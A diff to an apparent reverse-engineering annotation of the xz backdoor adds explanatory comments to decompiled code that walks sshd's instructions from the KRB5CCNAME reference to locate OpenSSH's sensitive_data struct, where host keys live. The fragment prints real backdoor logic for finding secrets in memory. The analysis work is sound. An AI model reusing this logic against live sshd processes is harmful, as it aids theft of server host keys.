@@ -5,10 +5,7 @@
 
 
 /*
- * AutoDoc: Starts from the unique reference to `"KRB5CCNAME"` and walks forward through the surrounding basic blocks. It only
- * accepts MOV/LEA instructions that copy getenv's return value into memory inside sshd's .data/.bss range with the same
- * -0x18 displacement pattern used by OpenSSH's `sensitive_data` struct. The address (minus 0x18) is returned as the
- * candidate base pointer that later holds host key material and Kerberos cache metadata.
+ * AutoDoc: Starts from the unique `"KRB5CCNAME"` reference, proves that getenv's return value is copied into sshd's `.data/.bss` region with the familiar -0x18 stride, and hands the caller the computed struct base. It tolerates both register-tracking MOV sequences and the LEA/zero-immediate variant OpenSSH uses when the pointer is materialised directly.
  */
 
 #include "xzre_types.h"
@@ -40,6 +37,7 @@ BOOL sshd_get_sensitive_data_address_via_krb5ccname
     zero_ctx_cursor = (dasm_ctx_t *)((long)&zero_ctx_cursor->instruction + 4);
   }
   *sensitive_data_out = (void *)0x0;
+  // AutoDoc: Use the cached string table to jump straight to the block that references `KRB5CCNAME`.
   krb5_string_ref = elf_find_string_reference(elf,STR_KRB5CCNAME,code_start,code_end);
   if (krb5_string_ref != (u8 *)0x0) {
     while (krb5_string_ref < code_end) {
@@ -93,6 +91,7 @@ LAB_0010346b:
                 *(undefined4 *)&zero_ctx_cursor->instruction = 0;
                 zero_ctx_cursor = (dasm_ctx_t *)((long)zero_ctx_cursor + (ulong)zero_seed * -8 + 4);
               }
+              // AutoDoc: After spotting the getenv result, walk the next few instructions looking for stores into `.bss`.
               store_scan_cursor = string_scan_ctx.instruction + string_scan_ctx.instruction_size;
               probe_depth = 0;
               while (((store_scan_cursor < code_end && (probe_depth < 6)) &&
@@ -120,11 +119,13 @@ LAB_00103553:
                       }
                     }
                     if (dest_reg == tracked_reg) {
+                      // AutoDoc: The following RIP-relative add reconstructs the absolute `.bss` pointer that getenv's return register is being stored into.
                       candidate_store = (u8 *)0x0;
                       if ((store_scan_ctx.prefix.flags_u16 & 0x100) != 0) {
                         candidate_store = store_scan_ctx.instruction +
                                  store_scan_ctx.instruction_size + store_scan_ctx.mem_disp;
                       }
+                      // AutoDoc: Back up by 0x18 bytes to convert the field pointer into the `sensitive_data` base address.
                       data_cursor = candidate_store + -0x18;
                       if ((data_start <= data_cursor && candidate_store != (u8 *)0x18) && (candidate_store + 4 <= data_end)
                          ) goto LAB_0010365f;
@@ -138,6 +139,7 @@ LAB_00103553:
             }
           }
         }
+        // AutoDoc: Fallback for the LEA/zero-immediate pattern that writes the struct pointer without first capturing getenv's return register.
         else if (*(u32 *)&string_scan_ctx.opcode_window[3] == 0x147) {
           if ((((((byte)string_scan_ctx.prefix.decoded.rex & 8) == 0) &&
                ((uint)string_scan_ctx.prefix.decoded.modrm >> 8 == 0x50000)) &&
